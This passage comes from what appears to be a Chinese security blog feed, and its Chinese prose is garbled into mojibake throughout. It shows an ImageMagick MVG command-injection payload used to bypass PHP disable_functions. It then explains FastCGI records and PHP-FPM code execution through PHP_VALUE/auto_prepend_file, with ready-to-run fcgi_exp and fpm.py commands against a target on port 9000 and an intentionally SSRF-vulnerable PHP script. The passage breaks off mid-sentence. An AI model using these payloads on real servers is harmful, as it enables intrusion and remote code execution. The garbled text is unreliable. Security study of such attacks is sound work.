class="hljs-number">640</span> <span class="hljs-number">480</span>fill <span class="hljs-string">&#x27;url(https://example.com/image.jpg&quot;|$command&quot;)&#x27;</span>pop graphic-contextEOF;file_put_contents(<span class="hljs-string">&quot;KKKK.mvg&quot;</span>, $exploit);$thumb = <span class="hljs-keyword">new</span> Imagick();$thumb-&gt;readImage(<span class="hljs-string">&#x27;KKKK.mvg&#x27;</span>);$thumb-&gt;writeImage(<span class="hljs-string">&#x27;KKKK.png&#x27;</span>);$thumb-&gt;clear();$thumb-&gt;destroy();unlink(<span class="hljs-string">&quot;KKKK.mvg&quot;</span>);unlink(<span class="hljs-string">&quot;KKKK.png&quot;</span>);<span class="hljs-meta">?&gt;</span></code></pre><p>å‚è€ƒï¼š<a href="https://whoamianony.top/2021/03/13/Web%E5%AE%89%E5%85%A8/Bypass%20Disable_functions/">https://whoamianony.top/2021/03/13/Webå®‰å…¨/Bypass Disable_functions/</a></p>]]></content>
    
    
    <categories>
      
      <category>bypass</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Bypass Disable Functionsï¼ˆäºŒï¼‰â€”â€” Fastcgi åè®®åˆ†æä¸ PHP-FPM æ”»å‡»æ–¹æ³•</title>
    <link href="/2021/08/14/ff2/"/>
    <url>/2021/08/14/ff2/</url>
    
    <content type="html"><![CDATA[<h3 id="æ¡ä»¶"><a class="header-anchor" href="#æ¡ä»¶">ğŸ­</a>æ¡ä»¶</h3><p>Linux æ“ä½œç³»ç»Ÿ PHP-FPM å­˜åœ¨å¯å†™çš„ç›®å½•ï¼Œéœ€è¦ä¸Šä¼ <code>.so</code>æ–‡ä»¶</p><h3 id="åŸç†"><a class="header-anchor" href="#åŸç†">ğŸ­</a>åŸç†</h3><h4 id="Fast-CGI"><a class="header-anchor" href="#Fast-CGI">ğŸ­</a>Fast-CGI</h4><p>CGIè§£å†³äº†WebæœåŠ¡å™¨ä¸PHPè§£é‡Šå™¨çš„é€šä¿¡é—®é¢˜ï¼Œä½†æ˜¯WebæœåŠ¡å™¨æ¯æ”¶åˆ°ä¸€ä¸ªè¯·æ±‚ï¼Œéƒ½ä¼šå»Forkä¸€ä¸ªCGIè¿›ç¨‹ï¼Œè¯·æ±‚ç»“æŸå†killæ‰è¿™ä¸ªè¿›ç¨‹ï¼Œå¾ˆæµªè´¹èµ„æºã€‚äºæ˜¯ï¼Œä¾¿å‡ºç°äº†CGIçš„æ”¹è‰¯ç‰ˆæœ¬â€”â€”Fast-CGIã€‚Fast-CGIæ¯æ¬¡å¤„ç†å®Œè¯·æ±‚åï¼Œä¸ä¼škillæ‰è¿™ä¸ªè¿›ç¨‹ï¼Œè€Œæ˜¯ä¿ç•™è¿™ä¸ªè¿›ç¨‹ï¼Œä½¿è¿™ä¸ªè¿›ç¨‹å¯ä»¥ä¸€æ¬¡å¤„ç†å¤šä¸ªè¯·æ±‚ï¼Œæé«˜æ•ˆç‡ã€‚</p><h4 id="æµè§ˆå™¨å¤„ç†é™æ€-åŠ¨æ€ç½‘é¡µè¿‡ç¨‹"><a class="header-anchor" href="#æµè§ˆå™¨å¤„ç†é™æ€-åŠ¨æ€ç½‘é¡µè¿‡ç¨‹">ğŸ­</a>æµè§ˆå™¨å¤„ç†é™æ€/åŠ¨æ€ç½‘é¡µè¿‡ç¨‹</h4><h5 id="é™æ€"><a class="header-anchor" href="#é™æ€">ğŸ­</a>é™æ€</h5><p><img src="/2021/08/14/ff2/1.png" alt="1"></p><h5 id="åŠ¨æ€"><a class="header-anchor" href="#åŠ¨æ€">ğŸ­</a>åŠ¨æ€</h5><p><img src="/2021/08/14/ff2/3.png" alt="3"></p><h4 id="Fast-CGI-Record"><a class="header-anchor" href="#Fast-CGI-Record">ğŸ­</a>Fast-CGI Record</h4><p>HTTPåè®®æ˜¯<strong>æµè§ˆå™¨å’ŒæœåŠ¡å™¨</strong>ä¸­é—´ä»¶è¿›è¡Œæ•°æ®äº¤æ¢çš„åè®®ï¼Œæµè§ˆå™¨å°†HTTPå¤´å’ŒHTTPä½“ç”¨æŸä¸ªè§„åˆ™ç»„è£…æˆæ•°æ®åŒ…ï¼Œä»¥TCPçš„æ–¹å¼å‘é€åˆ°æœåŠ¡å™¨ä¸­é—´ä»¶ï¼ŒæœåŠ¡å™¨ä¸­é—´ä»¶æŒ‰ç…§è§„åˆ™å°†æ•°æ®åŒ…è§£ç ï¼Œå¹¶æŒ‰è¦æ±‚æ‹¿åˆ°ç”¨æˆ·éœ€è¦çš„æ•°æ®ï¼Œå†ä»¥HTTPåè®®çš„è§„åˆ™æ‰“åŒ…è¿”å›ç»™æœåŠ¡å™¨ã€‚ç±»æ¯”HTTPï¼ŒCGIåè®®æ˜¯<strong>WebæœåŠ¡å™¨å’Œè§£é‡Šå™¨</strong>è¿›è¡Œæ•°æ®äº¤æ¢çš„åè®®ï¼Œå®ƒç”±å¤šæ¡recordç»„æˆï¼Œæ¯ä¸€æ¡recordéƒ½å’ŒHTTPä¸€æ ·ï¼Œä¹Ÿç”±headerå’Œbodyç»„æˆï¼ŒWebæœåŠ¡å™¨å°†è¿™äºŒè€…æŒ‰ç…§CGIè§„åˆ™å°è£…å¥½å‘é€ç»™è§£é‡Šå™¨ï¼Œè§£é‡Šå™¨è§£ç ä¹‹åæ‹¿åˆ°å…·ä½“æ•°æ®è¿›è¡Œæ“ä½œï¼Œå¾—åˆ°ç»“æœä¹‹åå†æ¬¡å°è£…å¥½è¿”å›ç»™WebæœåŠ¡å™¨ã€‚</p><p>recordçš„headerå¤´éƒ¨å›ºå®šçš„æ˜¯8ä¸ªå­—èŠ‚ï¼Œbodyæ˜¯ç”±å¤´ä¸­çš„contentLengthæŒ‡å®šï¼š</p><pre><code class="hljs cpp"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> </span><span class="hljs-class">&#123;</span><span class="hljs-comment">/*HEAD*/</span>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> version;              <span class="hljs-comment">//ç‰ˆæœ¬</span>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> type;                 <span class="hljs-comment">//ç±»å‹</span>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> requestIdB1;          <span class="hljs-comment">//id</span>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> requestIdB0;              <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> contentLengthB1;      <span class="hljs-comment">//bodyå¤§å°</span>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> contentLengthB0;    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> paddingLength;        <span class="hljs-comment">//é¢å¤–å¤§å°</span>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> reserved;       <span class="hljs-comment">/*BODY*/</span>   <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> contentData[contentLength];<span class="hljs-comment">//ä¸»è¦å†…å®¹</span>   <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> paddingData[paddingLength];<span class="hljs-comment">//é¢å¤–å†…å®¹</span>&#125;FCGI_Record;</code></pre><p>å¤´ç”±8ä¸ªucharç±»å‹çš„å˜é‡ç»„æˆï¼Œæ¯ä¸ªå˜é‡1å­—èŠ‚ã€‚å…¶ä¸­ï¼Œ<code>requestId</code>å ä¸¤ä¸ªå­—èŠ‚ï¼Œä¸€ä¸ªå”¯ä¸€çš„æ ‡å¿—idï¼Œä»¥é¿å…å¤šä¸ªè¯·æ±‚ä¹‹é—´çš„å½±å“ï¼›<code>contentLength</code>å ä¸¤ä¸ªå­—èŠ‚ï¼Œè¡¨ç¤ºbodyçš„å¤§å°ã€‚bodyä½“å°±æ˜¯è¯­è¨€ç«¯è§£æäº†fastcgiå¤´ä»¥åï¼Œæ‹¿åˆ°<code>contentLength</code>ååœ¨TCPæµé‡Œè¯»å–å¤§å°ç­‰äº<code>contentLength</code>çš„æ•°æ®ã€‚Bodyåé¢è¿˜æœ‰ä¸€æ®µé¢å¤–çš„æ•°æ®ï¼ˆPaddingï¼‰ï¼Œå…¶é•¿åº¦ç”±å¤´ä¸­çš„paddingLengthæŒ‡å®šï¼Œèµ·ä¿ç•™ä½œç”¨ã€‚ä¸€ä¸ªfastcgi recordç»“æ„æœ€å¤§æ”¯æŒçš„bodyå¤§å°æ˜¯<code>2^16</code>ï¼Œ65536å­—èŠ‚ã€‚</p><h4 id="Fastcgi-Type"><a class="header-anchor" href="#Fastcgi-Type">ğŸ­</a>Fastcgi Type</h4><p><code>type</code> æŒ‡å®šè¯¥ Record çš„ä½œç”¨ã€‚Fastcgi ä¸­ä¸€ä¸ª Record çš„å¤§å°æœ‰é™ä¸”ä½œç”¨å•ä¸€ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦åœ¨ä¸€ä¸ªTCPæµé‡Œä¼ è¾“å¤šä¸ª Recordï¼Œé€šè¿‡ <code>type</code> æ¥æ ‡å¿—æ¯ä¸ª Record çš„ä½œç”¨ï¼Œå¹¶ç”¨ <code>requestId</code> æ¥æ ‡è¯†åŒä¸€æ¬¡è¯·æ±‚çš„idã€‚æ¯æ¬¡è¯·æ±‚ï¼Œä¼šæœ‰å¤šä¸ª Recordï¼Œ<code>requestId</code> æ˜¯ç›¸åŒçš„ã€‚</p><p>ä¸»è¦çš„å‡ ç§ <code>type</code>ï¼š</p><table><thead><tr><th style="text-align:center">typeå€¼</th><th style="text-align:left">å…·ä½“å«ä¹‰</th></tr></thead><tbody><tr><td style="text-align:center">1</td><td style="text-align:left">åœ¨ä¸php-fpmå»ºç«‹è¿æ¥ä¹‹åå‘é€çš„ç¬¬ä¸€ä¸ªæ¶ˆæ¯ä¸­çš„typeå€¼å°±å¾—ä¸º1ï¼Œç”¨æ¥è¡¨æ˜æ­¤æ¶ˆæ¯ä¸ºè¯·æ±‚å¼€å§‹çš„ç¬¬ä¸€ä¸ªæ¶ˆæ¯</td></tr><tr><td style="text-align:center">2</td><td style="text-align:left">å¼‚å¸¸æ–­å¼€ä¸php-fpmçš„äº¤äº’</td></tr><tr><td style="text-align:center">3</td><td style="text-align:left">åœ¨ä¸php-fpmäº¤äº’ä¸­æ‰€å‘çš„æœ€åä¸€ä¸ªæ¶ˆæ¯ä¸­typeå€¼ä¸ºæ­¤ï¼Œä»¥è¡¨æ˜äº¤äº’çš„æ­£å¸¸ç»“æŸ</td></tr><tr><td style="text-align:center">4</td><td style="text-align:left">åœ¨äº¤äº’è¿‡ç¨‹ä¸­ç»™php-fpmä¼ é€’ç¯å¢ƒå˜é‡æ—¶ï¼Œå°†typeè®¾ä¸ºæ­¤ï¼Œä»¥è¡¨æ˜æ¶ˆæ¯ä¸­åŒ…å«çš„æ•°æ®ä¸ºæŸä¸ªname-valueå¯¹</td></tr><tr><td style="text-align:center">5</td><td style="text-align:left">WebæœåŠ¡å™¨å°†ä»æµè§ˆå™¨æ¥æ”¶åˆ°çš„POSTè¯·æ±‚æ•°æ®ï¼ˆè¡¨å•æäº¤ç­‰ï¼‰ä»¥æ¶ˆæ¯çš„å½¢å¼å‘ç»™php-fpmï¼Œè¿™ç§æ¶ˆæ¯çš„typeå°±å¾—è®¾ä¸º5</td></tr><tr><td style="text-align:center">6</td><td style="text-align:left">php-fpmç»™WebæœåŠ¡å™¨å›çš„æ­£å¸¸å“åº”æ¶ˆæ¯çš„typeå°±è®¾ä¸º6</td></tr><tr><td style="text-align:center">7</td><td style="text-align:left">php-fpmç»™WebæœåŠ¡å™¨å›çš„é”™è¯¯å“åº”è®¾ä¸º7</td></tr></tbody></table><p>æœåŠ¡å™¨ä¸­é—´ä»¶å’Œåç«¯è¯­è¨€é€šä¿¡ï¼Œç¬¬ä¸€ä¸ªæ•°æ®åŒ…å°±æ˜¯ <code>type</code> ä¸º1çš„ Recordï¼Œåç»­äº’ç›¸äº¤æµï¼Œå‘é€ <code>type</code> ä¸º4ã€5ã€6ã€7çš„ Recordï¼Œç»“æŸæ—¶å‘é€ <code>type</code> ä¸º2ã€3çš„ Recordã€‚å½“åç«¯è¯­è¨€æ¥æ”¶åˆ°ä¸€ä¸ª <code>type</code> ä¸º4çš„ Record åï¼Œå°±ä¼šæŠŠè¿™ä¸ª Record çš„ Body æŒ‰ç…§å¯¹åº”çš„ç»“æ„è§£ææˆ key-value å¯¹ï¼Œè§„åˆ™å¦‚ä¸‹ï¼š</p><ul><li>keyã€valueå‡å°äº128å­—èŠ‚ï¼Œç”¨ <code>FCGI_NameValuePair11</code></li><li>keyå¤§äº128å­—èŠ‚ï¼Œvalueå°äº128å­—èŠ‚ï¼Œç”¨ <code>FCGI_NameValuePair41</code></li><li>keyå°äº128å­—èŠ‚ï¼Œvalueå¤§äº128å­—èŠ‚ï¼Œç”¨ <code>FCGI_NameValuePair14</code></li><li>keyã€valueå‡å¤§äº128å­—èŠ‚ï¼Œç”¨ <code>FCGI_NameValuePair44</code></li></ul><h4 id="PHP-FPM"><a class="header-anchor" href="#PHP-FPM">ğŸ­</a>PHP-FPM</h4><p>FPMæ˜¯Fastcgiçš„åè®®è§£æå™¨ï¼ŒWebæœåŠ¡å™¨ä½¿ç”¨CGIåè®®å°è£…å¥½ç”¨æˆ·çš„è¯·æ±‚å‘é€ç»™FPMã€‚FPMæŒ‰ç…§CGIçš„åè®®å°†TCPæµè§£ææˆçœŸæ­£çš„æ•°æ®ã€‚</p><p>å½“ç”¨æˆ·è®¿é—®<code>http://127.0.0.1/index.php?a=1&amp;b=2</code>æ—¶ï¼ŒNginxä¼šå°†è¿™ä¸ªè¯·æ±‚å˜æˆå¦‚ä¸‹é”®å€¼å¯¹ï¼š</p><pre><code class="hljs 1c">&#123;    &#x27;GATEWAY_INTERFACE&#x27;: &#x27;FastCGI/1.0&#x27;,    &#x27;REQUEST_METHOD&#x27;: &#x27;GET&#x27;,    &#x27;SCRIPT_FILENAME&#x27;: &#x27;/var/www/html/index.php&#x27;,    &#x27;SCRIPT_NAME&#x27;: &#x27;/index.php&#x27;,    &#x27;QUERY_STRING&#x27;: &#x27;?a=1&amp;b=2&#x27;,    &#x27;REQUEST_URI&#x27;: &#x27;/index.php?a=1&amp;b=2&#x27;,    &#x27;DOCUMENT_ROOT&#x27;: &#x27;/var/www/html&#x27;,    &#x27;SERVER_SOFTWARE&#x27;: &#x27;php/fcgiclient&#x27;,    &#x27;REMOTE_ADDR&#x27;: &#x27;127.0.0.1&#x27;,    &#x27;REMOTE_PORT&#x27;: &#x27;<span class="hljs-number">1234</span>5&#x27;,    &#x27;SERVER_ADDR&#x27;: &#x27;127.0.0.1&#x27;,    &#x27;SERVER_PORT&#x27;: &#x27;80&#x27;,    &#x27;SERVER_NAME&#x27;: <span class="hljs-string">&quot;localhost&quot;</span>,    &#x27;SERVER_PROTOCOL&#x27;: &#x27;HTTP/1.1&#x27;&#125;</code></pre><p>è¿™ä¸ªæ•°ç»„å°±æ˜¯PHPä¸­SERVERæ•°ç»„çš„ä¸€éƒ¨åˆ†ï¼Œä¹Ÿå°±æ˜¯PHPé‡Œçš„ç¯å¢ƒå˜é‡ã€‚ç¯å¢ƒå˜é‡çš„ä½œç”¨ä¸ä»…æ˜¯å¡«å……_SERVERæ•°ç»„ï¼Œä¹Ÿæ˜¯å‘Šè¯‰fpmè¦æ‰§è¡Œçš„PHPæ–‡ä»¶ã€‚PHP-FPMæ‹¿åˆ°Fastcgiçš„æ•°æ®åŒ…åï¼Œè¿›è¡Œè§£æï¼Œå¾—åˆ°ä¸Šè¿°è¿™äº›ç¯å¢ƒå˜é‡ã€‚ç„¶åï¼Œæ‰§è¡Œ<code>SCRIPT_FILENAME</code>çš„å€¼æŒ‡å‘çš„PHPæ–‡ä»¶ï¼Œä¹Ÿå°±æ˜¯<code>/var/www/html/index.php</code>ã€‚å¦‚æœæˆ‘ä»¬èƒ½å¤Ÿæ§åˆ¶ <code>SCRIPT_FILENAME</code> çš„å€¼ï¼Œå°±å¯ä»¥è®© PHP-FPM æ‰§è¡ŒæœåŠ¡å™¨ä¸Šä»»æ„çš„ PHP æ–‡ä»¶äº†ã€‚</p><h3 id="PHP-FPM-ä»»æ„ä»£ç æ‰§è¡Œ"><a class="header-anchor" href="#PHP-FPM-ä»»æ„ä»£ç æ‰§è¡Œ">ğŸ­</a>PHP-FPM ä»»æ„ä»£ç æ‰§è¡Œ</h3><p>Web æœåŠ¡å™¨ä¸­é—´ä»¶ä¼šå°†ç”¨æˆ·è¯·æ±‚è®¾ç½®æˆç¯å¢ƒå˜é‡ï¼Œå¹¶ä¸”ä¼šå‡ºç°ä¸€ä¸ª <code>'SCRIPT_FILENAME': '/var/www/html/index.php'</code> è¿™æ ·çš„é”®å€¼å¯¹ï¼Œå³ä½¿èƒ½å¤Ÿæ§åˆ¶è¿™ä¸ªé”®å€¼å¯¹çš„å€¼ï¼Œä¹Ÿåªèƒ½æ§åˆ¶ PHP-FPM å»æ‰§è¡ŒæŸä¸ªå·²ç»å­˜åœ¨çš„æ–‡ä»¶ï¼Œä¸èƒ½å¤Ÿå®ç°ä¸€äº›æ¶æ„ä»£ç çš„æ‰§è¡Œã€‚å¹¶ä¸”åœ¨ PHP 5.3.9 åæ¥çš„ç‰ˆæœ¬ä¸­ï¼ŒPHP å¢åŠ äº† <code>security.limit_extensions</code> å®‰å…¨é€‰é¡¹ï¼Œå¯¼è‡´åªèƒ½æ§åˆ¶ PHP-FPM æ‰§è¡Œä¸€äº›åƒ phpã€php3ã€php4ã€php5ã€php7 è¿™æ ·çš„æ–‡ä»¶ã€‚ä½†æ˜¯ PHP ä¸­æœ‰ä¸¤ä¸ªé…ç½®é¡¹ï¼š</p><ul><li><code>auto_prepend_file</code>ï¼šåœ¨æ‰§è¡Œç›®æ ‡æ–‡ä»¶ä¹‹å‰ï¼Œå…ˆåŒ…å« <code>auto_prepend_file</code> ä¸­æŒ‡å®šçš„æ–‡ä»¶ã€‚</li><li><code>auto_append_file</code>ï¼šåœ¨æ‰§è¡Œå®Œæˆç›®æ ‡æ–‡ä»¶åï¼Œå†åŒ…å« <code>auto_append_file</code> æŒ‡å‘çš„æ–‡ä»¶ã€‚</li></ul><p>å‡è®¾æˆ‘ä»¬è®¾ç½® <code>auto_prepend_file</code> ä¸º <code>php://input</code>ï¼Œå°±ç­‰äºåœ¨æ‰§è¡Œä»»ä½• PHP æ–‡ä»¶å‰éƒ½è¦åŒ…å«ä¸€é POST çš„å†…å®¹ã€‚æŠŠéœ€è¦æ‰§è¡Œçš„ä»£ç æ”¾åœ¨ Body ä¸­å°±èƒ½è¢«æ‰§è¡Œäº†ï¼ˆéœ€è¦allow_url_include=onï¼‰</p><h5 id="è®¾ç½®-auto-prepend-file-çš„å€¼"><a class="header-anchor" href="#è®¾ç½®-auto-prepend-file-çš„å€¼">ğŸ­</a>è®¾ç½® <code>auto_prepend_file</code> çš„å€¼</h5><p>è¿™å°±æ¶‰åŠåˆ° PHP-FPM çš„ä¸¤ä¸ªç¯å¢ƒå˜é‡ï¼Œ<code>PHP_VALUE</code> å’Œ <code>PHP_ADMIN_VALUE</code>ã€‚<code>PHP_VALUE</code> å¯ä»¥è®¾ç½®æ¨¡å¼ä¸º <code>PHP_INI_USER</code> å’Œ <code>PHP_INI_ALL</code> çš„é€‰é¡¹ï¼Œ<code>PHP_ADMIN_VALUE</code> å¯ä»¥è®¾ç½®æ‰€æœ‰é€‰é¡¹ã€‚</p><p>ä¼ å…¥ç¯å¢ƒå˜é‡ï¼š</p><pre><code class="hljs 1c">&#123;    &#x27;GATEWAY_INTERFACE&#x27;: &#x27;FastCGI/1.0&#x27;,    &#x27;REQUEST_METHOD&#x27;: &#x27;GET&#x27;,    &#x27;SCRIPT_FILENAME&#x27;: &#x27;/var/www/html/index.php&#x27;,    &#x27;SCRIPT_NAME&#x27;: &#x27;/index.php&#x27;,    &#x27;QUERY_STRING&#x27;: &#x27;?a=1&amp;b=2&#x27;,    &#x27;REQUEST_URI&#x27;: &#x27;/index.php?a=1&amp;b=2&#x27;,    &#x27;DOCUMENT_ROOT&#x27;: &#x27;/var/www/html&#x27;,    &#x27;SERVER_SOFTWARE&#x27;: &#x27;php/fcgiclient&#x27;,    &#x27;REMOTE_ADDR&#x27;: &#x27;127.0.0.1&#x27;,    &#x27;REMOTE_PORT&#x27;: &#x27;<span class="hljs-number">1234</span>5&#x27;,    &#x27;SERVER_ADDR&#x27;: &#x27;127.0.0.1&#x27;,    &#x27;SERVER_PORT&#x27;: &#x27;80&#x27;,    &#x27;SERVER_NAME&#x27;: <span class="hljs-string">&quot;localhost&quot;</span>,    &#x27;SERVER_PROTOCOL&#x27;: &#x27;HTTP/1.1&#x27;    &#x27;PHP_VALUE&#x27;: &#x27;auto_prepend_file = php://input&#x27;,    &#x27;PHP_ADMIN_VALUE&#x27;: &#x27;allow_url_include = On&#x27;&#125;</code></pre><h3 id="PHP-FPM-æœªæˆæƒè®¿é—®æ¼æ´"><a class="header-anchor" href="#PHP-FPM-æœªæˆæƒè®¿é—®æ¼æ´">ğŸ­</a>PHP-FPM æœªæˆæƒè®¿é—®æ¼æ´</h3><h5 id="åŸç†-v2"><a class="header-anchor" href="#åŸç†-v2">ğŸ­</a>åŸç†</h5><p>æ”»å‡»è€…å¯ä»¥é€šè¿‡ <code>PHP_VALUE</code> å’Œ <code>PHP_ADMIN_VALUE</code> è¿™ä¸¤ä¸ªç¯å¢ƒå˜é‡è®¾ç½® PHP é…ç½®é€‰é¡¹ <code>auto_prepend_file</code> å’Œ <code>allow_url_include</code> ï¼Œä»è€Œä½¿ PHP-FPM RCEã€‚ç”±äº PHP-FPM å’Œ Web  æœåŠ¡å™¨ä¸­é—´ä»¶æ˜¯é€šè¿‡ç½‘ç»œè¿›è¡Œæ²Ÿé€šçš„ï¼Œè¶Šæ¥è¶Šå¤šçš„é›†ç¾¤å°† PHP-FPM  ç›´æ¥ç»‘å®šåœ¨å…¬ç½‘ä¸Šï¼Œæ‰€æœ‰äººéƒ½å¯ä»¥å¯¹å…¶è¿›è¡Œè®¿é—®ã€‚ä»»ä½•äººéƒ½å¯ä»¥ä¼ªè£…æˆWebæœåŠ¡å™¨ä¸­é—´ä»¶æ¥è®© PHP-FPM  æ‰§è¡Œæˆ‘ä»¬æƒ³æ‰§è¡Œçš„æ¶æ„ä»£ç ã€‚</p><h5 id="æ¡ä»¶-v2"><a class="header-anchor" href="#æ¡ä»¶-v2">ğŸ­</a>æ¡ä»¶</h5><p>é¶æœºï¼š</p><p>è®¾ç½®ç›‘å¬9000ç«¯å£æ¥å¤„ç†nginxçš„è¯·æ±‚ï¼Œå¹¶PHP-FPM æš´éœ²åœ¨ 0.0.0.0 ã€‚</p><pre><code class="hljs awk"><span class="hljs-regexp">//</span><span class="hljs-regexp">/etc/</span>php<span class="hljs-regexp">/7.4/</span>fpm<span class="hljs-regexp">/pool.d/</span>www.conf;listen = <span class="hljs-regexp">/run/</span>php/php7.<span class="hljs-number">4</span>-fpm.socklisten = <span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span>:<span class="hljs-number">9000</span></code></pre><p>nginxçš„é…ç½®æ–‡ä»¶ <code>/etc/nginx/sites-available/default</code> ä¸‹ç›¸åº”é…ç½®ï¼š</p><pre><code class="hljs nginx"><span class="hljs-section">server</span> &#123;    <span class="hljs-attribute">listen</span>       <span class="hljs-number">80</span>; <span class="hljs-comment">#ç›‘å¬80ç«¯å£ï¼Œæ¥æ”¶httpè¯·æ±‚</span>    <span class="hljs-attribute">server_name</span>  www.example.com; <span class="hljs-comment">#å°±æ˜¯ç½‘ç«™åœ°å€</span>    <span class="hljs-attribute">root</span> /var/www/html; <span class="hljs-comment"># å‡†å¤‡å­˜æ”¾ä»£ç å·¥ç¨‹çš„è·¯å¾„</span>    <span class="hljs-comment">#è·¯ç”±åˆ°ç½‘ç«™æ ¹ç›®å½•www.example.comæ—¶å€™çš„å¤„ç†</span>    <span class="hljs-attribute">location</span> / &#123;        <span class="hljs-attribute">index</span> index.php; <span class="hljs-comment">#è·³è½¬åˆ°www.example.com/index.php</span>        <span class="hljs-attribute">autoindex</span> <span class="hljs-literal">on</span>;    &#125;      <span class="hljs-comment">#å½“è¯·æ±‚ç½‘ç«™ä¸‹phpæ–‡ä»¶çš„æ—¶å€™ï¼Œåå‘ä»£ç†åˆ°php-fpm</span>    <span class="hljs-attribute">location</span> <span class="hljs-regexp">~ \.php$</span> &#123;        <span class="hljs-attribute">fastcgi_split_path_info</span><span class="hljs-regexp"> ^(.+\.php)(/.+)$</span>;        <span class="hljs-attribute">fastcgi_pass</span> <span class="hljs-number">0.0.0.0:9000</span>;<span class="hljs-comment">#nginx fastcgiè¿›ç¨‹ç›‘å¬çš„IPåœ°å€å’Œç«¯å£</span>        <span class="hljs-comment">#fastcgi_pass unix:/run/php/php7.4-fpm.sock;</span>        <span class="hljs-attribute">fastcgi_index</span> index.php;        <span class="hljs-attribute">include</span> fastcgi_params;    &#125;&#125;</code></pre><h5 id="fcgi-exp-go-æ”»å‡»"><a class="header-anchor" href="#fcgi-exp-go-æ”»å‡»">ğŸ­</a>fcgi_exp.go æ”»å‡»</h5><p>é¡¹ç›®åœ°å€ï¼š<a href="https://github.com/wofeiwo/webcgi-exploits">https://github.com/wofeiwo/webcgi-exploits</a></p><p>ç›´æ¥è¿è¡Œå¯ä»¥çœ‹åˆ° fcgi_exp çš„ä½¿ç”¨æ–¹æ³•ï¼š</p><p><img src="/2021/08/14/ff2/2.png" alt="2"></p><p>å‘½ä»¤æ ¼å¼</p><pre><code class="hljs routeros">./fcgi_exp<span class="hljs-built_in"> system </span>192.168.22.82 9000 /var/www/html/index.php <span class="hljs-string">&quot;id&quot;</span></code></pre><ul><li>systemï¼šè¦ä½¿ç”¨çš„PHPå‡½æ•°</li><li>192.168.22.82ï¼šç›®æ ‡æœºIP</li><li>9000ï¼šç›®æ ‡æœº fpm ç«¯å£</li><li>/var/www/html/index.phpï¼šå·²çŸ¥çš„ä½äºç›®æ ‡æœºä¸Šçš„PHPæ–‡ä»¶</li><li>idï¼šè¦æ‰§è¡Œçš„ç³»ç»Ÿå‘½ä»¤</li></ul><h5 id="fpm-pyæ”»å‡»"><a class="header-anchor" href="#fpm-pyæ”»å‡»">ğŸ­</a>fpm.pyæ”»å‡»</h5><p>é¡¹ç›®åœ°å€ï¼š<a href="https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75">https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75</a></p><p>åˆ©ç”¨æ–¹å¼</p><pre><code class="hljs php-template"><span class="xml">python fpm.py 192.168.43.82 /var/www/html/index.php -c &quot;</span><span class="php"><span class="hljs-meta">&lt;?php</span> system(<span class="hljs-string">&#x27;id&#x27;</span>); <span class="hljs-keyword">exit</span>(); <span class="hljs-meta">?&gt;</span></span><span class="xml">&quot;</span></code></pre><h3 id="SSRF-ä¸­å¯¹-FPM-FastCGI-çš„æ”»å‡»"><a class="header-anchor" href="#SSRF-ä¸­å¯¹-FPM-FastCGI-çš„æ”»å‡»">ğŸ­</a>SSRF ä¸­å¯¹ FPM/FastCGI çš„æ”»å‡»</h3><p>å½“PHP-FPM ä¸ç»‘å®šåœ¨ 0.0.0.0 ä¸Šé¢ï¼Œè€Œæ˜¯ 127.0.0.1ï¼Œè¿™æ ·ä¾¿é¿å…äº†å°† PHP-FPM æš´éœ²åœ¨å…¬ç½‘ä¸Šè¢«æ”»å‡»è€…è®¿é—®ï¼Œä½†æ˜¯å¦‚æœç›®æ ‡ä¸»æœºä¸Šå­˜åœ¨ SSRF æ¼æ´çš„è¯ï¼Œæˆ‘ä»¬ä¾¿å¯ä»¥é€šè¿‡ SSRF æ¼æ´æ”»å‡»å†…ç½‘çš„ PHP-FPM ã€‚</p><p>ä¸¾ä¸ªä¾‹å­ï¼š</p><p>å½“é¶æœºå­˜åœ¨ SSRF æ¼æ´çš„ä»£ç ï¼š</p><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span>    highlight_file(<span class="hljs-keyword">__FILE__</span>);    $url = $_GET[<span class="hljs-string">&#x27;url&#x27;</span>];    $curl = curl_init($url);        <span class="hljs-comment">//ç¬¬äºŒç§åˆå§‹åŒ–curlçš„æ–¹å¼</span>    <span class="hljs-comment">//$curl = curl_init(); curl_setopt($curl, CURLOPT_URL, $_GET[&#x27;url&#x27;]); </span>    <span class="hljs-comment">/*è¿›è¡Œcurlé…ç½®*/</span>    curl_setopt($curl, CURLOPT_HEADER, <span class="hljs-number">0</span>); <span class="hljs-comment">// ä¸è¾“å‡ºHTTPå¤´</span>    $responseText = curl_exec($curl);    <span class="hljs-keyword">echo</span> $responseText;    curl_close($curl);<span class="hljs-meta">?&gt;</span></code></pre><p>æ­¤æ—¶é€šè¿‡ SSRF å¯ä»¥æ¢æµ‹åˆ°ç›®æ ‡ä¸»æœºä¸Š 9000 ç«¯å£ä¸Šè¿è¡Œçš„ php-fpmã€‚è™½ç„¶ php-fpm æ²¡æœ‰æš´éœ²åœ¨å…¬ç½‘ä¸Šï¼Œä½†æˆ‘ä»¬å¯ä»¥é€šè¿‡ SSRF æ¼æ´é…åˆ Gopher åè®®æ‰“å†…ç½‘çš„ php-fpmã€‚</p><h4 id="åˆ©ç”¨-fcgi-exp-æ”»å‡»"><a class="header-anchor" href="#åˆ©ç”¨-fcgi-exp-æ”»å‡»">ğŸ­</a>åˆ©ç”¨ fcgi_exp æ”»å‡»</h4><p>ä»å¯ä»¥åˆ©ç”¨ ä¸Šé¢è®²åˆ°çš„fcgi_exp æ”»å‡»ï¼Œä½†æ­¤æ—¶ä¸èƒ½å†ç”¨ä¸Šé¢çš„payloadï¼Œå› 